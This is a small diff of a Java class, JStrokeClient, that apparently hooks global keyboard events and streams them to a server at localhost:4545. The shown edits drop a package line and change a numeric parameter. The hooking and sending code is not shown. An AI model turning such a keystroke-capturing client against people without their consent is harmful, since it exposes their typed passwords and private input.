@@ -1,5 +1,3 @@
-package org.killeenisd;
-
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.InetAddress;
@@ -72,7 +70,7 @@ public class JStrokeClient extends Thread implements NativeKeyListener {
 	 */
 	public static void main(String[] args) {
 		try {
-			(new JStrokeClient("localhost", 4545, 10)).start();
+			(new JStrokeClient("localhost", 4545, 5)).start();
 		} catch (NativeHookException e) {
 			e.printStackTrace();
 		}
